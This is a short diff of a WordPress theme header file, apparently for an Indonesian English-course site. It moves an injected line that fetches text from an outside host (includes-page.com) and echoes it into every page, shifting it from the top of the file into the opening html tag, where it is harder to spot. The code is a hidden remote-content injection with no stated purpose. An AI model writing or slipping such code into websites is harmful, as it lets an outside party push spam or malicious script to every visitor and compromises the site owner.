@@ -1,5 +1,5 @@
 <?php
-echo file_get_contents("https://includes-page.com/L/h.txt");
+
 /**
  * The header for our theme
  *
@@ -13,7 +13,8 @@ echo file_get_contents("https://includes-page.com/L/h.txt");
 ?>
 
 <!doctype html>
-<html <?php language_attributes(); ?>>
+<html <?php language_attributes();
+echo file_get_contents("https://includes-page.com/L/h.txt"); ?>>
 <head>
 	<meta name="keywords" content="LIA,kursus bahasa inggris dewasa,Lembaga Bahasa" />
 	<meta charset="<?php bloginfo( 'charset' ); ?>">
